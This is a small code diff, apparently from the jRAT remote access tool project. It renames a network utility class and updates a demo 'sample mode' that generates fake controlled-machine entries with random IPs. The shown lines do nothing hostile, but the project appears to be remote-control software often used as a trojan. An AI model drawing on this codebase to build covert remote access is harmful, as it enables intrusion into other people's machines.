@@ -6,7 +6,7 @@ import pro.jrat.ip2c.Country;
 import pro.jrat.settings.Settings;
 import pro.jrat.ui.frames.Frame;
 import pro.jrat.utils.FlagUtils;
-import pro.jrat.utils.NetworkUtils;
+import pro.jrat.utils.NetUtils;
 
 
 
@@ -267,7 +267,7 @@ public class SampleMode {
 	public static void make(String country) {
 		int i = (new Random()).nextInt(65535);
 		
-		String ip = NetworkUtils.randomizeIP() + " / " + i;
+		String ip = NetUtils.randomizeIP() + " / " + i;
 		
 		Slave slave = generate(country, ip);
 		
